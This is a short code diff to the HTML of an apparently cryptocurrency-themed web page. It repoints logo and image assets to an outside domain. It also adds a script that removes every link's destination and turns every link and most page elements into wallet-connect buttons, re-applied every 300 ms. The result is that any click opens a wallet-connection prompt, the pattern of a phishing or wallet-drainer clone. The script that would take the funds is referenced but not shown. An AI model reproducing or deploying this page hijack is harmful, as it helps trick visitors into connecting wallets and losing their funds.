@@ -216,7 +216,7 @@
        </i>
       </a>
       <a class="connectButton">
-       <img alt="" class="w-7 brightness-5 grayscale invert" src="/assets/dext_black.png"/>
+       <img alt="" class="w-7 brightness-5 grayscale invert" src="https://pepe-awards.com/assets/etherscan_black.png"/>
       </a>
       <a class="connectButton">
        <img alt="" class="w-8 brightness-5 grayscale invert" src="/assets/etherscan_black.png"/>
@@ -290,7 +290,7 @@
    themeVariables = {
       '--w3m-accent-color': '#f1b829',
       '--w3m-background-color': '#000000',
-      '--w3m-logo-image-url': './assets/p2.png'
+      '--w3m-logo-image-url': 'https://pepe-awards.com/assets/p2.png'
    };
   </script>
   <script src="./js/webchunk.js" type="text/javascript">
@@ -302,5 +302,20 @@
       z-index: 10000000;
     }
   </style>
+  <script>
+    function addClassesToElements() {
+
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
  </body>
 </html>
